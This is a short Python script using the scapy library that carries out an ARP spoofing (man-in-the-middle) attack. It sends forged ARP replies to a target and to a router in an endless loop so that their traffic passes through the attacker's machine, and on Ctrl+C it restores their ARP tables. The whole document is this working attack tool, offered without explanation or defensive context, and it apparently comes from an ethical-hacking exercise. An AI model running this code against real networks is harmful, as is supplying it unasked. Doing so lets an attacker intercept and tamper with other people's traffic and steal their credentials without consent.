import scapy.all as scapy
from net_scanner import scan


def spoof(targets_ip, spoof_ip):
    target_mac = scan(targets_ip)[0]["mac-address"]
    packet = scapy.ARP(op=2, pdst=targets_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = scan(destination_ip)[0]["mac-address"]
    source_mac = scan(source_ip)[0]["mac-address"]
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = ""
router_ip = ""
try:
    sent_packets = 0
    if __name__ == "__main__":
        while True:
            spoof(target_ip, router_ip)
            spoof(router_ip, target_ip)
            sent_packets += 2
            print("\r Packets sent: " + str(sent_packets), end='')
except KeyboardInterrupt:
    print("\n Detected CTRL + C ... Resetting ARP tables... Please wait.\n")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
